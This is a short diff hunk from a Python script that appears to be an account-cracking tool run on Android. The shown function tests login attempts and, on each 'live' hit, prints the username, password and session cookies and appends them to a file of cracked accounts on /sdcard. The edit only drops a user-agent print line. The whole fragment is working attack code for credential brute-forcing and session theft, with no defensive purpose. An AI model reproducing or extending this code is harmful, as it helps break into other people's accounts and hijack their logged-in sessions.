@@ -1179,7 +1179,6 @@ def m5(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            print(f"\r\033[38;5;196magent=[🤖]: {pro}\33[1;36m")
             open('/sdcard/ATOM-M5-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
